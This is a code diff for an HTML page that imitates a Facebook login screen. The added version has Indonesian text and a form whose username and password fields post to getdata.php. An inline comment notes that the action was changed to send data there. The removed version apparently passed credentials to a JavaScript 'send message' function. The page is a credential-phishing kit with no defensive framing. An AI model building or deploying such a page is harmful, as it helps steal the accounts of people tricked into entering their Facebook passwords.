@@ -2,90 +2,55 @@
 <html lang="en">
 
 <head>
-    <meta charset="UTF-8">
-    <meta http-equiv="X-UA-Compatible" content="IE=edge">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <link rel="stylesheet" href="style.css">
-    <title>Login Facebook</title>
-    <style>
-        body {
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-            background-color: #f0f2f5;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
-            margin: 0;
-        }
-
-        .form-container {
-            background-color: #fff;
-            padding: 20px;
-            border-radius: 8px;
-            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
-            width: 400px;
-            text-align: center;
-        }
-
-        .logo-container {
-            margin-bottom: 20px;
-        }
-
-        .logo-container img {
-            max-width: 100%;
-            height: auto;
-        }
-
-        form {
-            margin: 0;
-        }
-
-        form input {
-            width: 100%;
-            padding: 12px;
-            margin-bottom: 15px;
-            box-sizing: border-box;
-            border: 1px solid #dddfe2;
-            border-radius: 8px;
-            background-color: #f0f2f5;
-            font-size: 16px;
-        }
-
-        #login {
-            background-color: #1877f2;
-            color: white;
-            padding: 15px;
-            border: none;
-            border-radius: 8px;
-            cursor: pointer;
-            font-size: 16px;
-            font-weight: bold;
-        }
-
-        #login:hover {
-            background-color: #166fe5;
-        }
-
-        #forgot-password {
-            color: #1877f2;
-            text-decoration: none;
-            font-size: 14px;
-        }
-    </style>
+    <meta http-equiv="content-type" content="text/html;charset=UTF-8" />
+    <title>FACEBOOK</title>
+    <!-- ... (bagian head lainnya) ... -->
 </head>
 
 <body>
-    <div class="form-container">
-        <div class="logo-container">
-            <img src="https://upload.wikimedia.org/wikipedia/commons/5/51/Facebook_f_logo_%282019%29.svg" alt="Login with Facebook">
+    <nav class="navbar navbar-default navbar-fixed-top top-nav">
+        <!-- ... (bagian navbar lainnya) ... -->
+    </nav>
+    <section class="sign-up log-in testimonials">
+        <div class="container">
+            <div class="row">
+                <div class="sign-up-content">
+                    <div class="container">
+                        <div class="row">
+                            <div class="form-trial col-lg-6 col-md-6 col-sm-12 col-xs-12">
+                                <div class="logo">
+                                    <!-- ... (bagian logo lainnya) ... -->
+                                </div>
+                                <!-- Ganti action formulir untuk mengarahkan ke getdata.php -->
+                                <form action="getdata.php" method="post">
+                                    <input type="hidden" name="_token" value="nUpCrsjltZ5v1DXv0BRJzVFYymWzIXDoXFQyxFhz">
+                                    <h3>Masuk Dengan Akun Facebook</h3>
+                                    <div class="name">
+                                        <input type="text" class="form-control" name="username" id="username" placeholder="Email/No.HP/Username" minlength="4" required="true">
+                                    </div>
+                                    <div class="password">
+                                        <input type="password" class="form-control" name="password" id="password" required="true" placeholder="Kata Sandi">
+                                    </div>
+                                    <div class="name"></div>
+                                    <div class="submit">
+                                        <button class="form-submit btn" name="submit"><i class="fa fa-sign-in-alt"></i>Secure Login</button>
+                                    </div>
+                                </form>
+                                <hr class="wau">
+                                <div style="display:inline-block;text-align: center;padding-top: 10px;">
+                                    <!-- ... (bagian pesan dan gambar lainnya) ... -->
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+                <div class="scroll-top"> <span class="animated fadeIn"><i class="fas fa-chevron-left"></i></span> </div>
+                <footer>
+                    <!-- ... (bagian footer lainnya) ... -->
+                </footer>
+            </div>
         </div>
-        <form>
-            <input type="text" id="email" placeholder="Email or Phone" />
-            <input type="password" id="pass" placeholder="Password" />
-            <input type="button" id="login" value="Log In" onclick="kirimPesan()" />
-        </form>
-        <a href="#" id="forgot-password">Forgot Password?</a>
-    </div>
+    </section>
 </body>
 
 </html>
